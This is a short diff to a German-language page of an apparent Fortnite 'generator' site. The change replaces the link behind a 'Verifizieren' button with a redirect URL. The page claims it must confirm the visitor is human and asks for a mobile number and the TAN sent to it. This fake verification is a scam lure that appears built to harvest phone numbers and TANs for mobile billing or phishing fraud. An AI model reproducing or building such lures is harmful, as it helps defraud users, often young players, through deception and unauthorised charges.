@@ -42,7 +42,7 @@ define('IS_AJAX', isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&      strtolower($_
     <p>Um zu verhindern, dass unser Generator von Robotern missbraucht wird, müssen Sie sicherstellen, dass Sie ein Mensch sind, indem Sie Ihre Handynummer verwenden.</p>
     <br>
     <p>1. Klicken Sie unten auf die Schaltfläche "Verifizieren".</p>
-    <a href="https://reursary-cershine.com/7cd5c973-c0db-4039-86bf-4d780a1c6277"><button class="fortnite-button click-sound"><span>Verifizieren</span></button></a>
+    <a href="https://www.relinkz.com/qnC33i5xloo9yuUg"><button class="fortnite-button click-sound"><span>Verifizieren</span></button></a>
     <br>
     <p>2. Geben Sie Ihre Handynummer und die erhaltene TAN ein.</p>
     <br>
